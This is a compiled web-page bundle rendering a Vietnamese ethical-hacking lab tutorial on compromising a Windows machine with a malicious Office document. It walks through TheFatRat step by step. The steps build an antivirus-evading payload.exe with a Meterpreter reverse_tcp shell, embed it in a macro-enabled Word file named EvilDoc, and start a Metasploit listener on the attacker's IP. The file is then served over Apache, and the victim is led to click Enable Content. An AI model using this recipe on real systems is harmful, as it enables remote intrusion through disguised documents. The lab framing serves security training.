import{_ as t,c as a,a1 as c,o}from"./chunks/framework.BDxlaA_J.js";const g=JSON.parse('{"title":"Xâm nhập Windows bằng Tài liệu Office Độc hại sử dụng TheFatRat","description":"","frontmatter":{},"headers":[],"relativePath":"vi/categories/ethical-hacking-labs/5-system-hacking/6-Hacking-Windows-with-Doc-file.md","filePath":"vi/categories/ethical-hacking-labs/5-system-hacking/6-Hacking-Windows-with-Doc-file.md"}'),i={name:"vi/categories/ethical-hacking-labs/5-system-hacking/6-Hacking-Windows-with-Doc-file.md"};function n(h,e,r,s,l,d){return o(),a("div",null,e[0]||(e[0]=[c('<h1 id="xam-nhap-windows-bang-tai-lieu-office-đoc-hai-su-dung-thefatrat" tabindex="-1">Xâm nhập Windows bằng Tài liệu Office Độc hại sử dụng TheFatRat <a class="header-anchor" href="#xam-nhap-windows-bang-tai-lieu-office-đoc-hai-su-dung-thefatrat" aria-label="Permalink to &quot;Xâm nhập Windows bằng Tài liệu Office Độc hại sử dụng TheFatRat&quot;">​</a></h1><p>TheFatRat là một công cụ khai thác biên dịch malware với payload nổi tiếng, và sau đó malware được biên dịch có thể được thực thi trên Linux, Windows, Mac và Android. TheFatRat cung cấp cách dễ dàng để tạo Backdoor và Payload có thể vượt qua hầu hết các phần mềm diệt virus.</p><p>Kho lưu trữ chính thức: <a href="https://github.com/Screetsec/TheFatRat" target="_blank" rel="noreferrer">https://github.com/Screetsec/TheFatRat</a></p><h3 id="muc-tieu" tabindex="-1">Mục tiêu <a class="header-anchor" href="#muc-tieu" aria-label="Permalink to &quot;Mục tiêu&quot;">​</a></h3><ul><li>Cách sử dụng tài liệu office để khai thác máy Windows.</li></ul><h3 id="yeu-cau" tabindex="-1">Yêu cầu <a class="header-anchor" href="#yeu-cau" aria-label="Permalink to &quot;Yêu cầu&quot;">​</a></h3><ul><li>Máy ảo Windows Server 2016/2012.</li><li>Máy ảo Kali Linux.</li></ul><h2 id="thiet-lap-thefatrat" tabindex="-1">Thiết lập TheFatRat <a class="header-anchor" href="#thiet-lap-thefatrat" aria-label="Permalink to &quot;Thiết lập TheFatRat&quot;">​</a></h2><p>TheFatRat cung cấp cách dễ dàng để tạo backdoor và payload có thể vượt qua hầu hết các hệ thống diệt virus.</p><h3 id="thiet-lap" tabindex="-1">Thiết lập <a class="header-anchor" href="#thiet-lap" aria-label="Permalink to &quot;Thiết lập&quot;">​</a></h3><ol><li>Chuyển sang máy Kali và mở Terminal.</li><li>Điều hướng đến thư mục <strong>/opt/</strong>. <code>cd /opt</code></li><li>Clone kho lưu trữ github gốc từ FatRat: <code>git clone https://github.com/Screetsec/TheFatRat.git</code></li><li>Thay đổi quyền thư mục: <code>chmod -R 755 /opt/TheFatRat/</code></li><li>Truy cập thư mục TheFatRat: <code>cd TheFatRat/</code></li><li>Thực thi file bash <strong>(setup.sh)</strong> để bắt đầu cài đặt: <code>./setup.sh</code></li></ol><p>Một cửa sổ xterm Updating Kali Repo sẽ hiện ra như hình dưới đây:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/InstallingFatRat-0.png" alt="installing-fatRat"></p><h2 id="tao-file-backdoor" tabindex="-1">Tạo File Backdoor <a class="header-anchor" href="#tao-file-backdoor" aria-label="Permalink to &quot;Tạo File Backdoor&quot;">​</a></h2><p>Sau khi cài đặt hoàn tất, trong Terminal, nhập <code>fatrat</code> và nhấn enter.</p><p>Khi FatRat khởi chạy, bắt đầu xác minh các phụ thuộc đã cài đặt, bạn sẽ nhận được nhiều lời nhắc, chỉ cần nhấn Enter để tiếp tục.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/TheFatRat-1.png" alt="fatratmenu"></p><p>Trên menu FatRat, chọn <strong>[06] Create Fud Backdoor 1000% with PwnWindws [Excelent]</strong> bằng cách nhập <code>6</code>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e0a88cc5a5dc16d3f868e25305588c3f1a4336d2/pwnwind-1.png" alt="PwnWind"></p><p>Menu <strong>PwnWinds</strong> xuất hiện như hình trên, chọn <strong>[3] Create exe file with apache + Powershell (FUD 100%) by typing</strong> <code>3</code> trong menu.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/65ae135c7f8375eb60e15ac0ac936b142562ac66/payload.png" alt="payload"></p><p>Đặt <code>LHOST IP</code> thành IP Kali của bạn; <code>LPORT</code> thành <code>4444</code> và output thành <code>payload</code> như hình trên.</p><p>Tiếp theo, chọn <strong>[3] windows/meterpreter/reverse_tcp</strong> bằng cách nhập <code>3</code>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e68bd00de68fe3b81729e742f4fe28621e93140b/payload-choose.png" alt="payloadchoose"></p><p>Nếu mọi thứ hoạt động, fatrat sẽ tạo file <strong>payload.exe</strong> nằm trên /root/Fatrat_Generated/ như hình dưới đây:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Backdoor Saved To : /root/Fatrat_Generated/payload.exe</span></span></code></pre></div><h2 id="tao-file-word-đoc-hai" tabindex="-1">Tạo File Word Độc hại <a class="header-anchor" href="#tao-file-word-đoc-hai" aria-label="Permalink to &quot;Tạo File Word Độc hại&quot;">​</a></h2><p>Quay lại menu chính bằng cách chọn <strong>[9] Back to menu</strong>.</p><p>Trên menu chính, chọn <strong>[07] Create Backdoor For Office with Microsploit</strong></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/51c3113f08b47fc83c01fa8a5ff5fc1ed45bb21f/MicroSploit.png" alt="microsploit"></p><p>Trên menu Microsploit, chọn <strong>[2] The Microsoft Office Macro on Windows</strong> bằng cách nhập <code>2</code>.</p><h3 id="cac-cau-hinh-tiep-theo-se-la" tabindex="-1">Các cấu hình tiếp theo sẽ là: <a class="header-anchor" href="#cac-cau-hinh-tiep-theo-se-la" aria-label="Permalink to &quot;Các cấu hình tiếp theo sẽ là:&quot;">​</a></h3><ol><li><code>LHOST IP</code>: [IP Kali của bạn]</li><li><code>LPORT</code>: 4444</li><li><code>Enter the base name for output files</code>: EvilDoc</li><li><code>Enter the message for the document body</code>: you have been PWNED 😃</li><li>Lời nhắc tiếp theo sẽ hỏi bạn có muốn sử dụng file exe tùy chỉnh cho backdoor hay không. Chọn <code>y</code> cho <strong>yes</strong>.</li><li>Chỉ định đường dẫn chính xác đến file payload.exe bạn đã tạo ở đầu lab này: <strong>/root/Fatrat_Generated/payload.exe</strong></li><li>Trong Payload Option, chọn <strong>[3] windows/meterpreter/reverse_tcp</strong> bằng cách nhập <code>3</code>. Điều hướng đến thư mục output của FatRat để xem file Word được tạo.</li></ol><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c0c8c4ef9ecf358334343d4036a0bb98255272f7/evilFiles.png" alt="evilFiles"></p><h2 id="thiet-lap-listener" tabindex="-1">Thiết lập Listener <a class="header-anchor" href="#thiet-lap-listener" aria-label="Permalink to &quot;Thiết lập Listener&quot;">​</a></h2><p>Mở một cửa sổ Terminal khác và khởi chạy metasploit bằng cách nhập: <code>msfconsole</code>.</p><p>Chọn <strong>multi/handler</strong>: <code>use multi/handler</code></p><p>Đặt payload thành <strong>meterpreter/reverse_tcp</strong>: <code>set payload windows/meterpreter/reverse_tcp</code></p><p>Đặt <strong>LHOST</strong> thành IP Kali và <strong>LPORT</strong> thành <strong>4444</strong>: <code>set LHOST 10.0.2.42</code><code>set LPORT 4444</code></p><p>Nhập <strong>run</strong> để bắt đầu listener: <code>run</code></p><h2 id="chia-se-file-doc-đoc-hai" tabindex="-1">Chia sẻ File Doc Độc hại <a class="header-anchor" href="#chia-se-file-doc-đoc-hai" aria-label="Permalink to &quot;Chia sẻ File Doc Độc hại&quot;">​</a></h2><p>Để chia sẻ file độc hại với máy Windows, sao chép file Doc vào thư mục apache. Mở một cửa sổ Terminal mới và nhập: <code>cp /root/Fatrat_Generated/EvilDoc.docm /var/www/html/share/</code></p><p>Sau đó, khởi động dịch vụ apache: <code>service apache2 start</code></p><h2 id="mo-file-doc-đoc-hai" tabindex="-1">Mở File Doc Độc hại <a class="header-anchor" href="#mo-file-doc-đoc-hai" aria-label="Permalink to &quot;Mở File Doc Độc hại&quot;">​</a></h2><p>Chuyển sang máy Windows và mở <strong>trình duyệt</strong>.</p><p>Nhập URL (dựa trên IP Kali của bạn): <code>http://10.0.2.42/share/</code></p><p>Sau đó, tải file doc độc hại bạn đã tạo.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/evilfile-0.png" alt="EvilFile-0"></p><p>Mở thư mục tải về và nhấp vào file MS Word.</p><p>MS Word mở file trong Protected View. Nhấp vào <strong>Enable Editing</strong> như hình dưới đây:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/maliciousword.png" alt="ms-word-protected-view"></p><p>Nếu bạn nhận được <strong>SECURITY WARNING</strong> do Macro, nhấp vào <strong>Enable Content</strong>.</p><p>Bây giờ chuyển lại Kali, nếu mọi thứ hoạt động, bạn sẽ thấy có một <strong>phiên Meterpreter</strong> đang mở trong terminal Metasploit.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/meterpreter-docfile.png" alt="meterpreter-docfile"></p><p>Bây giờ bạn có thể xem chi tiết hệ thống đã khai thác và v.v. Không chính thức bạn có thể gọi hành động này là &#39;thành quả&#39; 😃</p>',55)]))}const u=t(i,[["render",n]]);export{g as __pageData,u as default};
